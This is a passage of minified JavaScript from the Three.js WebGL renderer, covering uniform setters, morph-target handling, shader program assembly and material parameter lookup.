i)t.update(i[n],34962);var r=e.morphAttributes;for(var n in r)for(var o=r[n],a=0,s=o.length;a<s;a++)t.update(o[a],34962)},getWireframeAttribute:function(e){var t=o.get(e);if(t){var i=e.index;null!==i&&t.version<i.version&&s(e)}else s(e);return o.get(e)}}}function mi(e,t,i,n){var r,o,a,s=n.isWebGL2;this.setMode=function(e){r=e},this.setIndex=function(e){o=e.type,a=e.bytesPerElement},this.render=function(t,n){e.drawElements(r,n,o,t*a),i.update(n,r)},this.renderInstances=function(n,c,l,h){if(0!==h){var u,d;if(s)u=e,d="drawElementsInstanced";else if(d="drawElementsInstancedANGLE",null===(u=t.get("ANGLE_instanced_arrays")))return void console.error("THREE.WebGLIndexedBufferRenderer: using THREE.InstancedBufferGeometry but hardware does not support extension ANGLE_instanced_arrays.");u[d](r,l,o,c*a,h),i.update(l,r,h)}}}function vi(e){var t={frame:0,calls:0,triangles:0,points:0,lines:0};return{memory:{geometries:0,textures:0},render:t,programs:null,autoReset:!0,reset:function(){t.frame++,t.calls=0,t.triangles=0,t.points=0,t.lines=0},update:function(e,i,n){switch(n=n||1,t.calls++,i){case 4:t.triangles+=n*(e/3);break;case 5:case 6:t.triangles+=n*(e-2);break;case 1:t.lines+=n*(e/2);break;case 3:t.lines+=n*(e-1);break;case 2:t.lines+=n*e;break;case 0:t.points+=n*e;break;default:console.error("THREE.WebGLInfo: Unknown draw mode:",i)}}}}function gi(e,t){return e[0]-t[0]}function yi(e,t){return Math.abs(t[1])-Math.abs(e[1])}function bi(e){for(var t={},i=new Float32Array(8),n=[],r=0;r<8;r++)n[r]=[r,0];return{update:function(r,o,a,s){var c=r.morphTargetInfluences,l=c.length,h=t[o.id];if(void 0===h){h=[];for(var u=0;u<l;u++)h[u]=[u,0];t[o.id]=h}for(u=0;u<l;u++){(f=h[u])[0]=u,f[1]=c[u]}for(h.sort(yi),u=0;u<8;u++)u<l&&h[u][1]?(n[u][0]=h[u][0],n[u][1]=h[u][1]):(n[u][0]=Number.MAX_SAFE_INTEGER,n[u][1]=0);n.sort(gi);var d=a.morphTargets&&o.morphAttributes.position,p=a.morphNormals&&o.morphAttributes.normal;for(u=0;u<8;u++){var f,m=(f=n[u])[0],v=f[1];m!==Number.MAX_SAFE_INTEGER&&v?(d&&o.getAttribute("morphTarget"+u)!==d[m]&&o.addAttribute("morphTarget"+u,d[m]),p&&o.getAttribute("morphNormal"+u)!==p[m]&&o.addAttribute("morphNormal"+u,p[m]),i[u]=v):(d&&void 0!==o.getAttribute("morphTarget"+u)&&o.removeAttribute("morphTarget"+u),p&&void 0!==o.getAttribute("morphNormal"+u)&&o.removeAttribute("morphNormal"+u),i[u]=0)}s.getUniforms().setValue(e,"morphTargetInfluences",i)}}}function wi(e,t,i,n){var r={};return{update:function(e){var o=n.render.frame,a=e.geometry,s=t.get(e,a);return r[s.id]!==o&&(a.isGeometry&&s.updateFromObject(e),t.update(s),r[s.id]=o),e.isInstancedMesh&&i.update(e.instanceMatrix,34962),s},dispose:function(){r={}}}}function xi(e,t,i,n,r,o,a,s,c,l){e=void 0!==e?e:[],t=void 0!==t?t:301,a=void 0!==a?a:1022,S.call(this,e,t,i,n,r,o,a,s,c,l),this.flipY=!1}function _i(e,t,i,n){S.call(this,null),this.image={data:e||null,width:t||1,height:i||1,depth:n||1},this.magFilter=1003,this.minFilter=1003,this.wrapR=1001,this.generateMipmaps=!1,this.flipY=!1,this.needsUpdate=!0}function Mi(e,t,i,n){S.call(this,null),this.image={data:e||null,width:t||1,height:i||1,depth:n||1},this.magFilter=1003,this.minFilter=1003,this.wrapR=1001,this.generateMipmaps=!1,this.flipY=!1,this.needsUpdate=!0}ni.physical={uniforms:jt([ni.standard.uniforms,{transparency:{value:0},clearcoat:{value:0},clearcoatRoughness:{value:0},sheen:{value:new Ne(0)},clearcoatNormalScale:{value:new f(1,1)},clearcoatNormalMap:{value:null}}]),vertexShader:ti.meshphysical_vert,fragmentShader:ti.meshphysical_frag},ai.prototype=Object.create(zt.prototype),ai.prototype.constructor=ai,si.prototype=Object.create(dt.prototype),si.prototype.constructor=si,xi.prototype=Object.create(S.prototype),xi.prototype.constructor=xi,xi.prototype.isCubeTexture=!0,Object.defineProperty(xi.prototype,"images",{get:function(){return this.image},set:function(e){this.image=e}}),_i.prototype=Object.create(S.prototype),_i.prototype.constructor=_i,_i.prototype.isDataTexture2DArray=!0,Mi.prototype=Object.create(S.prototype),Mi.prototype.constructor=Mi,Mi.prototype.isDataTexture3D=!0;var Si=new S,Ti=new _i,Ei=new Mi,Ai=new xi,Ci=[],Pi=[],Li=new Float32Array(16),Ri=new Float32Array(9),ki=new Float32Array(4);function Oi(e,t,i){var n=e[0];if(n<=0||n>0)return e;var r=t*i,o=Ci[r];if(void 0===o&&(o=new Float32Array(r),Ci[r]=o),0!==t){n.toArray(o,0);for(var a=1,s=0;a!==t;++a)s+=i,e[a].toArray(o,s)}return o}function Ii(e,t){if(e.length!==t.length)return!1;for(var i=0,n=e.length;i<n;i++)if(e[i]!==t[i])return!1;return!0}function Bi(e,t){for(var i=0,n=t.length;i<n;i++)e[i]=t[i]}function Di(e,t){var i=Pi[t];void 0===i&&(i=new Int32Array(t),Pi[t]=i);for(var n=0;n!==t;++n)i[n]=e.allocateTextureUnit();return i}function zi(e,t){var i=this.cache;i[0]!==t&&(e.uniform1f(this.addr,t),i[0]=t)}function Fi(e,t){var i=this.cache;if(void 0!==t.x)i[0]===t.x&&i[1]===t.y||(e.uniform2f(this.addr,t.x,t.y),i[0]=t.x,i[1]=t.y);else{if(Ii(i,t))return;e.uniform2fv(this.addr,t),Bi(i,t)}}function Ni(e,t){var i=this.cache;if(void 0!==t.x)i[0]===t.x&&i[1]===t.y&&i[2]===t.z||(e.uniform3f(this.addr,t.x,t.y,t.z),i[0]=t.x,i[1]=t.y,i[2]=t.z);else if(void 0!==t.r)i[0]===t.r&&i[1]===t.g&&i[2]===t.b||(e.uniform3f(this.addr,t.r,t.g,t.b),i[0]=t.r,i[1]=t.g,i[2]=t.b);else{if(Ii(i,t))return;e.uniform3fv(this.addr,t),Bi(i,t)}}function ji(e,t){var i=this.cache;if(void 0!==t.x)i[0]===t.x&&i[1]===t.y&&i[2]===t.z&&i[3]===t.w||(e.uniform4f(this.addr,t.x,t.y,t.z,t.w),i[0]=t.x,i[1]=t.y,i[2]=t.z,i[3]=t.w);else{if(Ii(i,t))return;e.uniform4fv(this.addr,t),Bi(i,t)}}function Ui(e,t){var i=this.cache,n=t.elements;if(void 0===n){if(Ii(i,t))return;e.uniformMatrix2fv(this.addr,!1,t),Bi(i,t)}else{if(Ii(i,n))return;ki.set(n),e.uniformMatrix2fv(this.addr,!1,ki),Bi(i,n)}}function Vi(e,t){var i=this.cache,n=t.elements;if(void 0===n){if(Ii(i,t))return;e.uniformMatrix3fv(this.addr,!1,t),Bi(i,t)}else{if(Ii(i,n))return;Ri.set(n),e.uniformMatrix3fv(this.addr,!1,Ri),Bi(i,n)}}function Hi(e,t){var i=this.cache,n=t.elements;if(void 0===n){if(Ii(i,t))return;e.uniformMatrix4fv(this.addr,!1,t),Bi(i,t)}else{if(Ii(i,n))return;Li.set(n),e.uniformMatrix4fv(this.addr,!1,Li),Bi(i,n)}}function Gi(e,t,i){var n=this.cache,r=i.allocateTextureUnit();n[0]!==r&&(e.uniform1i(this.addr,r),n[0]=r),i.safeSetTexture2D(t||Si,r)}function Wi(e,t,i){var n=this.cache,r=i.allocateTextureUnit();n[0]!==r&&(e.uniform1i(this.addr,r),n[0]=r),i.setTexture2DArray(t||Ti,r)}function qi(e,t,i){var n=this.cache,r=i.allocateTextureUnit();n[0]!==r&&(e.uniform1i(this.addr,r),n[0]=r),i.setTexture3D(t||Ei,r)}function Xi(e,t,i){var n=this.cache,r=i.allocateTextureUnit();n[0]!==r&&(e.uniform1i(this.addr,r),n[0]=r),i.safeSetTextureCube(t||Ai,r)}function Yi(e,t){var i=this.cache;i[0]!==t&&(e.uniform1i(this.addr,t),i[0]=t)}function Zi(e,t){var i=this.cache;Ii(i,t)||(e.uniform2iv(this.addr,t),Bi(i,t))}function Qi(e,t){var i=this.cache;Ii(i,t)||(e.uniform3iv(this.addr,t),Bi(i,t))}function $i(e,t){var i=this.cache;Ii(i,t)||(e.uniform4iv(this.addr,t),Bi(i,t))}function Ji(e,t){e.uniform1fv(this.addr,t)}function Ki(e,t){e.uniform1iv(this.addr,t)}function en(e,t){e.uniform2iv(this.addr,t)}function tn(e,t){e.uniform3iv(this.addr,t)}function nn(e,t){e.uniform4iv(this.addr,t)}function rn(e,t){var i=Oi(t,this.size,2);e.uniform2fv(this.addr,i)}function on(e,t){var i=Oi(t,this.size,3);e.uniform3fv(this.addr,i)}function an(e,t){var i=Oi(t,this.size,4);e.uniform4fv(this.addr,i)}function sn(e,t){var i=Oi(t,this.size,4);e.uniformMatrix2fv(this.addr,!1,i)}function cn(e,t){var i=Oi(t,this.size,9);e.uniformMatrix3fv(this.addr,!1,i)}function ln(e,t){var i=Oi(t,this.size,16);e.uniformMatrix4fv(this.addr,!1,i)}function hn(e,t,i){var n=t.length,r=Di(i,n);e.uniform1iv(this.addr,r);for(var o=0;o!==n;++o)i.safeSetTexture2D(t[o]||Si,r[o])}function un(e,t,i){var n=t.length,r=Di(i,n);e.uniform1iv(this.addr,r);for(var o=0;o!==n;++o)i.safeSetTextureCube(t[o]||Ai,r[o])}function dn(e,t,i){this.id=e,this.addr=i,this.cache=[],this.setValue=function(e){switch(e){case 5126:return zi;case 35664:return Fi;case 35665:return Ni;case 35666:return ji;case 35674:return Ui;case 35675:return Vi;case 35676:return Hi;case 35678:case 36198:return Gi;case 35679:return qi;case 35680:return Xi;case 36289:return Wi;case 5124:case 35670:return Yi;case 35667:case 35671:return Zi;case 35668:case 35672:return Qi;case 35669:case 35673:return $i}}(t.type)}function pn(e,t,i){this.id=e,this.addr=i,this.cache=[],this.size=t.size,this.setValue=function(e){switch(e){case 5126:return Ji;case 35664:return rn;case 35665:return on;case 35666:return an;case 35674:return sn;case 35675:return cn;case 35676:return ln;case 35678:return hn;case 35680:return un;case 5124:case 35670:return Ki;case 35667:case 35671:return en;case 35668:case 35672:return tn;case 35669:case 35673:return nn}}(t.type)}function fn(e){this.id=e,this.seq=[],this.map={}}pn.prototype.updateCache=function(e){var t=this.cache;e instanceof Float32Array&&t.length!==e.length&&(this.cache=new Float32Array(e.length)),Bi(t,e)},fn.prototype.setValue=function(e,t,i){for(var n=this.seq,r=0,o=n.length;r!==o;++r){var a=n[r];a.setValue(e,t[a.id],i)}};var mn=/([\w\d_]+)(\])?(\[|\.)?/g;function vn(e,t){e.seq.push(t),e.map[t.id]=t}function gn(e,t,i){var n=e.name,r=n.length;for(mn.lastIndex=0;;){var o=mn.exec(n),a=mn.lastIndex,s=o[1],c="]"===o[2],l=o[3];if(c&&(s|=0),void 0===l||"["===l&&a+2===r){vn(i,void 0===l?new dn(s,e,t):new pn(s,e,t));break}var h=i.map[s];void 0===h&&vn(i,h=new fn(s)),i=h}}function yn(e,t){this.seq=[],this.map={};for(var i=e.getProgramParameter(t,35718),n=0;n<i;++n){var r=e.getActiveUniform(t,n);gn(r,e.getUniformLocation(t,r.name),this)}}function bn(e,t,i){var n=e.createShader(t);return e.shaderSource(n,i),e.compileShader(n),n}yn.prototype.setValue=function(e,t,i,n){var r=this.map[t];void 0!==r&&r.setValue(e,i,n)},yn.prototype.setOptional=function(e,t,i){var n=t[i];void 0!==n&&this.setValue(e,i,n)},yn.upload=function(e,t,i,n){for(var r=0,o=t.length;r!==o;++r){var a=t[r],s=i[a.id];!1!==s.needsUpdate&&a.setValue(e,s.value,n)}},yn.seqWithValue=function(e,t){for(var i=[],n=0,r=e.length;n!==r;++n){var o=e[n];o.id in t&&i.push(o)}return i};var wn=0;function xn(e){switch(e){case 3e3:return["Linear","( value )"];case 3001:return["sRGB","( value )"];case 3002:return["RGBE","( value )"];case 3004:return["RGBM","( value, 7.0 )"];case 3005:return["RGBM","( value, 16.0 )"];case 3006:return["RGBD","( value, 256.0 )"];case 3007:return["Gamma","( value, float( GAMMA_FACTOR ) )"];case 3003:return["LogLuv","( value )"];default:throw new Error("unsupported encoding: "+e)}}function _n(e,t,i){var n=e.getShaderParameter(t,35713),r=e.getShaderInfoLog(t).trim();return n&&""===r?"":"THREE.WebGLShader: gl.getShaderInfoLog() "+i+"\n"+r+function(e){for(var t=e.split("\n"),i=0;i<t.length;i++)t[i]=i+1+": "+t[i];return t.join("\n")}(e.getShaderSource(t))}function Mn(e,t){var i=xn(t);return"vec4 "+e+"( vec4 value ) { return "+i[0]+"ToLinear"+i[1]+"; }"}function Sn(e,t){var i;switch(t){case 1:i="Linear";break;case 2:i="Reinhard";break;case 3:i="Uncharted2";break;case 4:i="OptimizedCineon";break;case 5:i="ACESFilmic";break;default:throw new Error("unsupported toneMapping: "+t)}return"vec3 "+e+"( vec3 color ) { return "+i+"ToneMapping( color ); }"}function Tn(e){return""!==e}function En(e,t){return e.replace(/NUM_DIR_LIGHTS/g,t.numDirLights).replace(/NUM_SPOT_LIGHTS/g,t.numSpotLights).replace(/NUM_RECT_AREA_LIGHTS/g,t.numRectAreaLights).replace(/NUM_POINT_LIGHTS/g,t.numPointLights).replace(/NUM_HEMI_LIGHTS/g,t.numHemiLights).replace(/NUM_DIR_LIGHT_SHADOWS/g,t.numDirLightShadows).replace(/NUM_SPOT_LIGHT_SHADOWS/g,t.numSpotLightShadows).replace(/NUM_POINT_LIGHT_SHADOWS/g,t.numPointLightShadows)}function An(e,t){return e.replace(/NUM_CLIPPING_PLANES/g,t.numClippingPlanes).replace(/UNION_CLIPPING_PLANES/g,t.numClippingPlanes-t.numClipIntersection)}var Cn=/^[ \t]*#include +<([\w\d./]+)>/gm;function Pn(e){return e.replace(Cn,Ln)}function Ln(e,t){var i=ti[t];if(void 0===i)throw new Error("Can not resolve #include <"+t+">");return Pn(i)}var Rn=/#pragma unroll_loop[\s]+?for \( int i \= (\d+)\; i < (\d+)\; i \+\+ \) \{([\s\S]+?)(?=\})\}/g;function kn(e){return e.replace(Rn,On)}function On(e,t,i,n){for(var r="",o=parseInt(t);o<parseInt(i);o++)r+=n.replace(/\[ i \]/g,"[ "+o+" ]").replace(/UNROLLED_LOOP_INDEX/g,o);return r}function In(e){var t="precision "+e.precision+" float;\nprecision "+e.precision+" int;";return"highp"===e.precision?t+="\n#define HIGH_PRECISION":"mediump"===e.precision?t+="\n#define MEDIUM_PRECISION":"lowp"===e.precision&&(t+="\n#define LOW_PRECISION"),t}function Bn(e,t,i,n,r,o,a){var s,c,l,h,u,d=e.getContext(),p=n.defines,f=r.vertexShader,m=r.fragmentShader,v=function(e){var t="SHADOWMAP_TYPE_BASIC";return 1===e.shadowMapType?t="SHADOWMAP_TYPE_PCF":2===e.shadowMapType?t="SHADOWMAP_TYPE_PCF_SOFT":3===e.shadowMapType&&(t="SHADOWMAP_TYPE_VSM"),t}(o),g=function(e){var t="ENVMAP_TYPE_CUBE";if(e.envMap)switch(e.envMapMode){case 301:case 302:t="ENVMAP_TYPE_CUBE";break;case 306:case 307:t="ENVMAP_TYPE_CUBE_UV";break;case 303:case 304:t="ENVMAP_TYPE_EQUIREC";break;case 305:t="ENVMAP_TYPE_SPHERE"}return t}(o),y=function(e){var t="ENVMAP_MODE_REFLECTION";if(e.envMap)switch(e.envMapMode){case 302:case 304:t="ENVMAP_MODE_REFRACTION"}return t}(o),b=function(e){var t="ENVMAP_BLENDING_MULTIPLY";if(e.envMap)switch(e.combine){case 0:t="ENVMAP_BLENDING_MULTIPLY";break;case 1:t="ENVMAP_BLENDING_MIX";break;case 2:t="ENVMAP_BLENDING_ADD"}return t}(o),w=e.gammaFactor>0?e.gammaFactor:1,x=o.isWebGL2?"":function(e,t,i){return[(e=e||{}).derivatives||t.envMapCubeUV||t.bumpMap||t.tangentSpaceNormalMap||t.clearcoatNormalMap||t.flatShading?"#extension GL_OES_standard_derivatives : enable":"",(e.fragDepth||t.logarithmicDepthBuffer)&&i.get("EXT_frag_depth")?"#extension GL_EXT_frag_depth : enable":"",e.drawBuffers&&i.get("WEBGL_draw_buffers")?"#extension GL_EXT_draw_buffers : require":"",(e.shaderTextureLOD||t.envMap)&&i.get("EXT_shader_texture_lod")?"#extension GL_EXT_shader_texture_lod : enable":""].filter(Tn).join("\n")}(n.extensions,o,t),_=function(e){var t=[];for(var i in e){var n=e[i];!1!==n&&t.push("#define "+i+" "+n)}return t.join("\n")}(p),M=d.createProgram(),S=o.numMultiviewViews;if(n.isRawShaderMaterial?((s=[_].filter(Tn).join("\n")).length>0&&(s+="\n"),(c=[x,_].filter(Tn).join("\n")).length>0&&(c+="\n")):(s=[In(o),"#define SHADER_NAME "+r.name,_,o.instancing?"#define USE_INSTANCING":"",o.supportsVertexTextures?"#define VERTEX_TEXTURES":"","#define GAMMA_FACTOR "+w,"#define MAX_BONES "+o.maxBones,o.useFog&&o.fog?"#define USE_FOG":"",o.useFog&&o.fogExp2?"#define FOG_EXP2":"",o.map?"#define USE_MAP":"",o.envMap?"#define USE_ENVMAP":"",o.envMap?"#define "+y:"",o.lightMap?"#define USE_LIGHTMAP":"",o.aoMap?"#define USE_AOMAP":"",o.emissiveMap?"#define USE_EMISSIVEMAP":"",o.bumpMap?"#define USE_BUMPMAP":"",o.normalMap?"#define USE_NORMALMAP":"",o.normalMap&&o.objectSpaceNormalMap?"#define OBJECTSPACE_NORMALMAP":"",o.normalMap&&o.tangentSpaceNormalMap?"#define TANGENTSPACE_NORMALMAP":"",o.clearcoatNormalMap?"#define USE_CLEARCOAT_NORMALMAP":"",o.displacementMap&&o.supportsVertexTextures?"#define USE_DISPLACEMENTMAP":"",o.specularMap?"#define USE_SPECULARMAP":"",o.roughnessMap?"#define USE_ROUGHNESSMAP":"",o.metalnessMap?"#define USE_METALNESSMAP":"",o.alphaMap?"#define USE_ALPHAMAP":"",o.vertexTangents?"#define USE_TANGENT":"",o.vertexColors?"#define USE_COLOR":"",o.vertexUvs?"#define USE_UV":"",o.flatShading?"#define FLAT_SHADED":"",o.skinning?"#define USE_SKINNING":"",o.useVertexTexture?"#define BONE_TEXTURE":"",o.morphTargets?"#define USE_MORPHTARGETS":"",o.morphNormals&&!1===o.flatShading?"#define USE_MORPHNORMALS":"",o.doubleSided?"#define DOUBLE_SIDED":"",o.flipSided?"#define FLIP_SIDED":"",o.shadowMapEnabled?"#define USE_SHADOWMAP":"",o.shadowMapEnabled?"#define "+v:"",o.sizeAttenuation?"#define USE_SIZEATTENUATION":"",o.logarithmicDepthBuffer?"#define USE_LOGDEPTHBUF":"",o.logarithmicDepthBuffer&&(o.isWebGL2||t.get("EXT_frag_depth"))?"#define USE_LOGDEPTHBUF_EXT":"","uniform mat4 modelMatrix;","uniform mat4 modelViewMatrix;","uniform mat4 projectionMatrix;","uniform mat4 viewMatrix;","uniform mat3 normalMatrix;","uniform vec3 cameraPosition;","#ifdef USE_INSTANCING"," attribute mat4 instanceMatrix;","#endif","attribute vec3 position;","attribute vec3 normal;","attribute vec2 uv;","#ifdef USE_TANGENT","\tattribute vec4 tangent;","#endif","#ifdef USE_COLOR","\tattribute vec3 color;","#endif","#ifdef USE_MORPHTARGETS","\tattribute vec3 morphTarget0;","\tattribute vec3 morphTarget1;","\tattribute vec3 morphTarget2;","\tattribute vec3 morphTarget3;","\t#ifdef USE_MORPHNORMALS","\t\tattribute vec3 morphNormal0;","\t\tattribute vec3 morphNormal1;","\t\tattribute vec3 morphNormal2;","\t\tattribute vec3 morphNormal3;","\t#else","\t\tattribute vec3 morphTarget4;","\t\tattribute vec3 morphTarget5;","\t\tattribute vec3 morphTarget6;","\t\tattribute vec3 morphTarget7;","\t#endif","#endif","#ifdef USE_SKINNING","\tattribute vec4 skinIndex;","\tattribute vec4 skinWeight;","#endif","\n"].filter(Tn).join("\n"),c=[x,In(o),"#define SHADER_NAME "+r.name,_,o.alphaTest?"#define ALPHATEST "+o.alphaTest+(o.alphaTest%1?"":".0"):"","#define GAMMA_FACTOR "+w,o.useFog&&o.fog?"#define USE_FOG":"",o.useFog&&o.fogExp2?"#define FOG_EXP2":"",o.map?"#define USE_MAP":"",o.matcap?"#define USE_MATCAP":"",o.envMap?"#define USE_ENVMAP":"",o.envMap?"#define "+g:"",o.envMap?"#define "+y:"",o.envMap?"#define "+b:"",o.lightMap?"#define USE_LIGHTMAP":"",o.aoMap?"#define USE_AOMAP":"",o.emissiveMap?"#define USE_EMISSIVEMAP":"",o.bumpMap?"#define USE_BUMPMAP":"",o.normalMap?"#define USE_NORMALMAP":"",o.normalMap&&o.objectSpaceNormalMap?"#define OBJECTSPACE_NORMALMAP":"",o.normalMap&&o.tangentSpaceNormalMap?"#define TANGENTSPACE_NORMALMAP":"",o.clearcoatNormalMap?"#define USE_CLEARCOAT_NORMALMAP":"",o.specularMap?"#define USE_SPECULARMAP":"",o.roughnessMap?"#define USE_ROUGHNESSMAP":"",o.metalnessMap?"#define USE_METALNESSMAP":"",o.alphaMap?"#define USE_ALPHAMAP":"",o.sheen?"#define USE_SHEEN":"",o.vertexTangents?"#define USE_TANGENT":"",o.vertexColors?"#define USE_COLOR":"",o.vertexUvs?"#define USE_UV":"",o.gradientMap?"#define USE_GRADIENTMAP":"",o.flatShading?"#define FLAT_SHADED":"",o.doubleSided?"#define DOUBLE_SIDED":"",o.flipSided?"#define FLIP_SIDED":"",o.shadowMapEnabled?"#define USE_SHADOWMAP":"",o.shadowMapEnabled?"#define "+v:"",o.premultipliedAlpha?"#define PREMULTIPLIED_ALPHA":"",o.physicallyCorrectLights?"#define PHYSICALLY_CORRECT_LIGHTS":"",o.logarithmicDepthBuffer?"#define USE_LOGDEPTHBUF":"",o.logarithmicDepthBuffer&&(o.isWebGL2||t.get("EXT_frag_depth"))?"#define USE_LOGDEPTHBUF_EXT":"",(n.extensions&&n.extensions.shaderTextureLOD||o.envMap)&&(o.isWebGL2||t.get("EXT_shader_texture_lod"))?"#define TEXTURE_LOD_EXT":"","uniform mat4 viewMatrix;","uniform vec3 cameraPosition;",0!==o.toneMapping?"#define TONE_MAPPING":"",0!==o.toneMapping?ti.tonemapping_pars_fragment:"",0!==o.toneMapping?Sn("toneMapping",o.toneMapping):"",o.dithering?"#define DITHERING":"",o.outputEncoding||o.mapEncoding||o.matcapEncoding||o.envMapEncoding||o.emissiveMapEncoding?ti.encodings_pars_fragment:"",o.mapEncoding?Mn("mapTexelToLinear",o.mapEncoding):"",o.matcapEncoding?Mn("matcapTexelToLinear",o.matcapEncoding):"",o.envMapEncoding?Mn("envMapTexelToLinear",o.envMapEncoding):"",o.emissiveMapEncoding?Mn("emissiveMapTexelToLinear",o.emissiveMapEncoding):"",o.outputEncoding?(l="linearToOutputTexel",h=o.outputEncoding,u=xn(h),"vec4 "+l+"( vec4 value ) { return LinearTo"+u[0]+u[1]+"; }"):"",o.depthPacking?"#define DEPTH_PACKING "+n.depthPacking:"","\n"].filter(Tn).join("\n")),f=An(f=En(f=Pn(f),o),o),m=An(m=En(m=Pn(m),o),o),f=kn(f),m=kn(m),o.isWebGL2&&!n.isRawShaderMaterial){var T=!1,E=/^\s*#version\s+300\s+es\s*\n/;n.isShaderMaterial&&null!==f.match(E)&&null!==m.match(E)&&(T=!0,f=f.replace(E,""),m=m.replace(E,"")),s=["#version 300 es\n","#define attribute in","#define varying out","#define texture2D texture"].join("\n")+"\n"+s,c=["#version 300 es\n","#define varying in",T?"":"out highp vec4 pc_fragColor;",T?"":"#define gl_FragColor pc_fragColor","#define gl_FragDepthEXT gl_FragDepth","#define texture2D texture","#define textureCube texture","#define texture2DProj textureProj","#define texture2DLodEXT textureLod","#define texture2DProjLodEXT textureProjLod","#define textureCubeLodEXT textureLod","#define texture2DGradEXT textureGrad","#define texture2DProjGradEXT textureProjGrad","#define textureCubeGradEXT textureGrad"].join("\n")+"\n"+c,S>0&&(s=(s=s.replace("#version 300 es\n",["#version 300 es\n","#extension GL_OVR_multiview2 : require","layout(num_views = "+S+") in;","#define VIEW_ID gl_ViewID_OVR"].join("\n"))).replace(["uniform mat4 modelViewMatrix;","uniform mat4 projectionMatrix;","uniform mat4 viewMatrix;","uniform mat3 normalMatrix;"].join("\n"),["uniform mat4 modelViewMatrices["+S+"];","uniform mat4 projectionMatrices["+S+"];","uniform mat4 viewMatrices["+S+"];","uniform mat3 normalMatrices["+S+"];","#define modelViewMatrix modelViewMatrices[VIEW_ID]","#define projectionMatrix projectionMatrices[VIEW_ID]","#define viewMatrix viewMatrices[VIEW_ID]","#define normalMatrix normalMatrices[VIEW_ID]"].join("\n")),c=(c=c.replace("#version 300 es\n",["#version 300 es\n","#extension GL_OVR_multiview2 : require","#define VIEW_ID gl_ViewID_OVR"].join("\n"))).replace("uniform mat4 viewMatrix;",["uniform mat4 viewMatrices["+S+"];","#define viewMatrix viewMatrices[VIEW_ID]"].join("\n")))}var A,C,P=c+m,L=bn(d,35633,s+f),R=bn(d,35632,P);if(d.attachShader(M,L),d.attachShader(M,R),void 0!==n.index0AttributeName?d.bindAttribLocation(M,0,n.index0AttributeName):!0===o.morphTargets&&d.bindAttribLocation(M,0,"position"),d.linkProgram(M),e.debug.checkShaderErrors){var k=d.getProgramInfoLog(M).trim(),O=d.getShaderInfoLog(L).trim(),I=d.getShaderInfoLog(R).trim(),B=!0,D=!0;if(!1===d.getProgramParameter(M,35714)){B=!1;var z=_n(d,L,"vertex"),F=_n(d,R,"fragment");console.error("THREE.WebGLProgram: shader error: ",d.getError(),"35715",d.getProgramParameter(M,35715),"gl.getProgramInfoLog",k,z,F)}else""!==k?console.warn("THREE.WebGLProgram: gl.getProgramInfoLog()",k):""!==O&&""!==I||(D=!1);D&&(this.diagnostics={runnable:B,material:n,programLog:k,vertexShader:{log:O,prefix:s},fragmentShader:{log:I,prefix:c}})}return d.deleteShader(L),d.deleteShader(R),this.getUniforms=function(){return void 0===A&&(A=new yn(d,M)),A},this.getAttributes=function(){return void 0===C&&(C=function(e,t){for(var i={},n=e.getProgramParameter(t,35721),r=0;r<n;r++){var o=e.getActiveAttrib(t,r).name;i[o]=e.getAttribLocation(t,o)}return i}(d,M)),C},this.destroy=function(){a.releaseStatesOfProgram(this),d.deleteProgram(M),this.program=void 0},this.name=r.name,this.id=wn++,this.code=i,this.usedTimes=1,this.program=M,this.vertexShader=L,this.fragmentShader=R,this.numMultiviewViews=S,this}function Dn(e,t,i,n){var r=[],o=i.isWebGL2,a=i.logarithmicDepthBuffer,s=i.floatVertexTextures,c=i.precision,l=i.maxVertexUniforms,h=i.vertexTextures,u={MeshDepthMaterial:"depth",MeshDistanceMaterial:"distanceRGBA",MeshNormalMaterial:"normal",MeshBasicMaterial:"basic",MeshLambertMaterial:"lambert",MeshPhongMaterial:"phong",MeshToonMaterial:"phong",MeshStandardMaterial:"physical",MeshPhysicalMaterial:"physical",MeshMatcapMaterial:"matcap",LineBasicMaterial:"basic",LineDashedMaterial:"dashed",PointsMaterial:"points",ShadowMaterial:"shadow",SpriteMaterial:"sprite"},d=["precision","isWebGL2","supportsVertexTextures","outputEncoding","instancing","numMultiviewViews","map","mapEncoding","matcap","matcapEncoding","envMap","envMapMode","envMapEncoding","envMapCubeUV","lightMap","aoMap","emissiveMap","emissiveMapEncoding","bumpMap","normalMap","objectSpaceNormalMap","tangentSpaceNormalMap","clearcoatNormalMap","displacementMap","specularMap","roughnessMap","metalnessMap","gradientMap","alphaMap","combine","vertexColors","vertexTangents","vertexUvs","fog","useFog","fogExp2","flatShading","sizeAttenuation","logarithmicDepthBuffer","skinning","maxBones","useVertexTexture","morphTargets","morphNormals","maxMorphTargets","maxMorphNormals","premultipliedAlpha","numDirLights","numPointLights","numSpotLights","numHemiLights","numRectAreaLights","numDirLightShadows","numPointLightShadows","numSpotLightShadows","shadowMapEnabled","shadowMapType","toneMapping","physicallyCorrectLights","alphaTest","doubleSided","flipSided","numClippingPlanes","numClipIntersection","depthPacking","dithering","sheen"];function p(e,t){var i;return e?e.isTexture?i=e.encoding:e.isWebGLRenderTarget&&(console.warn("THREE.WebGLPrograms.getTextureEncodingFromMap: don't use render targets as textures. Use their .texture property instead."),i=e.texture.encoding):i=3e3,3e3===i&&t&&(i=3007),i}this.getParameters=function(t,n,r,d,f,m,v){var g=u[t.type],y=v.isSkinnedMesh?function(e){var t=e.skeleton.bones;if(s)return 1024;var i=l,n=Math.floor((i-20)/4),r=Math.min(n,t.length);return r<t.length?(console.warn("THREE.WebGLRenderer: Skeleton has "+t.length+" bones. This GPU supports "+r+"."),0):r}(v):0;null!==t.precision&&(c=i.getMaxPrecision(t.precision))!==t.precision&&console.warn("THREE.WebGLProgram.getParameters:",t.precision,"not supported, using",c,"instead.");var b=e.getRenderTarget(),w=b&&b.isWebGLMultiviewRenderTarget?b.numViews:0;return{isWebGL2:o,shaderID:g,precision:c,instancing:!0===v.isInstancedMesh,supportsVertexTextures:h,numMultiviewViews:w,outputEncoding:p(b?b.texture:null,e.gammaOutput),map:!!t.map,mapEncoding:p(t.map,e.gammaInput),matcap:!!t.matcap,matcapEncoding:p(t.matcap,e.gammaInput),envMap:!!t.envMap,envMapMode:t.envMap&&t.envMap.mapping,envMapEncoding:p(t.envMap,e.gammaInput),envMapCubeUV:!!t.envMap&&(306===t.envMap.mapping||307===t.envMap.mapping),lightMap:!!t.lightMap,aoMap:!!t.aoMap,emissiveMap:!!t.emissiveMap,emissiveMapEncoding:p(t.emissiveMap,e.gammaInput),bumpMap:!!t.bumpMap,normalMap:!!t.normalMap,objectSpaceNormalMap:1===t.normalMapType,tangentSpaceNormalMap:0===t.normalMapType,clearcoatNormalMap:!!t.clearcoatNormalMap,displacementMap:!!t.displacementMap,roughnes